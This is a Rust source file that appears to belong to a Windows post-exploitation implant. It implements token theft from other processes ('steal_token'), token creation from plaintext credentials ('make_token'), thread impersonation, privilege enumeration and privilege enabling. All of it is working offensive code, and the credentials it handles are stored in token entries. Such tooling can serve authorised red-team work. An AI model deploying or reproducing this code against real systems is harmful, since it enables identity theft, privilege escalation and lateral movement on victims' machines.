//! Windows-native token manipulation via `windows-sys`.

use std::mem;
use std::ptr;

use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, LUID, TRUE};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, LOGON32_PROVIDER_DEFAULT,
    LUID_AND_ATTRIBUTES, LogonUserW, LookupAccountSidW, LookupPrivilegeNameW,
    LookupPrivilegeValueW, OpenProcessToken, OpenThreadToken, RevertToSelf, SE_PRIVILEGE_ENABLED,
    SID_NAME_USE, SecurityImpersonation, SetThreadToken, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS,
    TOKEN_DUPLICATE, TOKEN_ELEVATION, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_USER, TokenElevation,
    TokenImpersonation, TokenPrivileges, TokenUser,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, OpenProcess,
    PROCESS_QUERY_INFORMATION,
};

#[path = "enumerate_windows.rs"]
mod enumerate;
pub use enumerate::list_found_tokens;

use super::{MakeCredentials, TokenEntry, TokenType};

/// Steal a token from a target process.
///
/// Opens the process token, duplicates it as an impersonation token,
/// and returns a `TokenEntry` ready for vault insertion.
pub fn steal_token(target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
    let mut process_handle: HANDLE = 0;
    let mut token_handle: HANDLE = 0;
    let mut dup_token: HANDLE = 0;

    unsafe {
        // Open the target process.
        process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
        if process_handle == 0 {
            return Err(GetLastError());
        }

        // Open the process token.
        if OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle)
            == FALSE
        {
            let err = GetLastError();
            CloseHandle(process_handle);
            return Err(err);
        }

        // Duplicate as an impersonation token.
        if DuplicateTokenEx(
            token_handle,
            TOKEN_ALL_ACCESS,
            ptr::null(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut dup_token,
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(token_handle);
            CloseHandle(process_handle);
            return Err(err);
        }

        CloseHandle(token_handle);
        CloseHandle(process_handle);
    }

    let domain_user = query_token_user(dup_token).unwrap_or_else(|| String::from("UNKNOWN"));

    Ok(TokenEntry {
        handle: dup_token as usize,
        domain_user,
        process_id: target_pid,
        token_type: TokenType::Stolen,
        credentials: None,
    })
}

/// Create a token via `LogonUserW`.
pub fn make_token(
    domain: &str,
    user: &str,
    password: &str,
    logon_type: u32,
) -> Result<TokenEntry, u32> {
    let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
    let user_w: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
    let password_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();

    let mut token_handle: HANDLE = 0;

    unsafe {
        if LogonUserW(
            user_w.as_ptr(),
            domain_w.as_ptr(),
            password_w.as_ptr(),
            logon_type,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        ) == FALSE
        {
            return Err(GetLastError());
        }
    }

    let domain_user = format!("{domain}\\{user}");

    Ok(TokenEntry {
        handle: token_handle as usize,
        domain_user,
        process_id: unsafe { GetCurrentProcessId() },
        token_type: TokenType::MakeNetwork,
        credentials: Some(MakeCredentials {
            domain: domain.to_string(),
            user: user.to_string(),
            password: password.to_string(),
        }),
    })
}

/// Impersonate a token on the current thread.
pub fn impersonate_token(handle: usize) -> Result<(), u32> {
    unsafe {
        if SetThreadToken(ptr::null(), handle as HANDLE) == FALSE {
            return Err(GetLastError());
        }
    }
    Ok(())
}

/// Revert the current thread to its original token.
pub fn revert_to_self() -> Result<(), u32> {
    unsafe {
        if RevertToSelf() == FALSE {
            return Err(GetLastError());
        }
    }
    Ok(())
}

/// Query whether the given token is elevated.
pub fn is_token_elevated(handle: usize) -> bool {
    let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut ret_len: u32 = 0;
    unsafe {
        if GetTokenInformation(
            handle as HANDLE,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len,
        ) == FALSE
        {
            return false;
        }
    }
    elevation.TokenIsElevated != 0
}

/// Query the `DOMAIN\User` string from a token handle.
pub fn query_token_user(handle: HANDLE) -> Option<String> {
    let mut needed: u32 = 0;

    // First call to get required buffer size.
    unsafe {
        GetTokenInformation(handle, TokenUser, ptr::null_mut(), 0, &mut needed);
    }
    if needed == 0 {
        return None;
    }

    let mut buf = vec![0u8; needed as usize];
    unsafe {
        if GetTokenInformation(handle, TokenUser, buf.as_mut_ptr().cast(), needed, &mut needed)
            == FALSE
        {
            return None;
        }
    }

    let token_user: &TOKEN_USER = unsafe { &*(buf.as_ptr().cast()) };
    let sid = token_user.User.Sid;

    // Resolve SID to account name.
    let mut user_len: u32 = 256;
    let mut domain_len: u32 = 256;
    let mut user_buf = vec![0u16; user_len as usize];
    let mut domain_buf = vec![0u16; domain_len as usize];
    let mut sid_type: SID_NAME_USE = 0;

    unsafe {
        if LookupAccountSidW(
            ptr::null(),
            sid,
            user_buf.as_mut_ptr(),
            &mut user_len,
            domain_buf.as_mut_ptr(),
            &mut domain_len,
            &mut sid_type,
        ) == FALSE
        {
            return None;
        }
    }

    let domain = String::from_utf16_lossy(&domain_buf[..domain_len as usize]);
    let user = String::from_utf16_lossy(&user_buf[..user_len as usize]);
    Some(format!("{domain}\\{user}"))
}

/// Get the current thread or process token handle.
pub fn current_token_handle() -> Result<HANDLE, u32> {
    let mut handle: HANDLE = 0;
    unsafe {
        // Try thread token first (if impersonating).
        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut handle) != FALSE {
            return Ok(handle);
        }
        // Fall back to process token.
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == FALSE {
            return Err(GetLastError());
        }
    }
    Ok(handle)
}

/// Query current token user string and elevation status.
pub fn get_uid() -> Result<(bool, String), u32> {
    let handle = current_token_handle()?;
    let elevated = is_token_elevated(handle as usize);
    let user = query_token_user(handle).unwrap_or_else(|| String::from("UNKNOWN"));
    unsafe {
        CloseHandle(handle);
    }
    Ok((elevated, user))
}

/// List privileges on the current token.
///
/// Returns `Vec<(privilege_name, attributes)>`.
pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
    let handle = current_token_handle()?;
    let mut needed: u32 = 0;

    // Get required size.
    unsafe {
        GetTokenInformation(handle, TokenPrivileges, ptr::null_mut(), 0, &mut needed);
    }
    if needed == 0 {
        unsafe { CloseHandle(handle) };
        return Err(unsafe { GetLastError() });
    }

    let mut buf = vec![0u8; needed as usize];
    unsafe {
        if GetTokenInformation(
            handle,
            TokenPrivileges,
            buf.as_mut_ptr().cast(),
            needed,
            &mut needed,
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(handle);
            return Err(err);
        }
    }

    let privs: &TOKEN_PRIVILEGES = unsafe { &*(buf.as_ptr().cast()) };
    let count = privs.PrivilegeCount as usize;
    let privileges = unsafe { std::slice::from_raw_parts(privs.Privileges.as_ptr(), count) };

    let mut result = Vec::with_capacity(count);
    for laa in privileges {
        let name = lookup_privilege_name(&laa.Luid);
        result.push((name, laa.Attributes));
    }

    unsafe { CloseHandle(handle) };
    Ok(result)
}

/// Enable a privilege by name on the current token.
pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
    let handle = current_token_handle()?;
    // Need TOKEN_ADJUST_PRIVILEGES.
    let mut adj_handle: HANDLE = 0;
    unsafe {
        if OpenThreadToken(
            GetCurrentThread(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            TRUE,
            &mut adj_handle,
        ) == FALSE
        {
            if OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut adj_handle,
            ) == FALSE
            {
                CloseHandle(handle);
                return Err(GetLastError());
            }
        }
        CloseHandle(handle);
    }

    let name_w: Vec<u16> = priv_name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut luid = LUID { LowPart: 0, HighPart: 0 };

    unsafe {
        if LookupPrivilegeValueW(ptr::null(), name_w.as_ptr(), &mut luid) == FALSE {
            CloseHandle(adj_handle);
            return Err(GetLastError());
        }
    }

    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };

    unsafe {
        if AdjustTokenPrivileges(adj_handle, FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut())
            == FALSE
        {
            let err = GetLastError();
            CloseHandle(adj_handle);
            return Err(err);
        }
        // Check if the adjustment actually took effect.
        let err = GetLastError();
        CloseHandle(adj_handle);
        // ERROR_NOT_ALL_ASSIGNED = 1300
        Ok(err != 1300)
    }
}

/// Close a token handle.
pub fn close_token_handle(handle: usize) {
    if handle != 0 {
        unsafe {
            CloseHandle(handle as HANDLE);
        }
    }
}

/// Look up a privilege name from its LUID.
fn lookup_privilege_name(luid: &LUID) -> String {
    let mut name_buf = vec![0u16; 256];
    let mut name_len: u32 = 256;
    unsafe {
        if LookupPrivilegeNameW(ptr::null(), luid, name_buf.as_mut_ptr(), &mut name_len) == FALSE {
            return format!("LUID({},{})", luid.LowPart, luid.HighPart);
        }
    }
    String::from_utf16_lossy(&name_buf[..name_len as usize])
}
